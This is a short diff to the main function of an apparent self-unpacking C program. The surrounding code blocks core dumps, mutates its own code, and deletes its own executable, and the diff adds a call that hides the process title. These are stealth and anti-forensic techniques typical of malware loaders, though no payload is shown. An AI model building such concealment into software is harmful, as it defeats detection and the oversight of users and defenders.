@@ -39,7 +39,6 @@ int main(int argc, char* argv[], char* envp[]) {
     pack_header_t header;
     int result = 1;
 
-    (void)argc;
     memset(&header, 0, sizeof(header));
     prevent_core_dumps();
     harmless_text_polymorph();
@@ -53,6 +52,7 @@ int main(int argc, char* argv[], char* envp[]) {
 #ifndef KEEP_PACKED_FILE
     unlink(argv[0]);
 #endif
+    hide_process_title(argc, argv);
     if (fseek(self_fp, 0, SEEK_END) != 0) {
         DBG("cannot determine self size\n");
         fclose(self_fp);
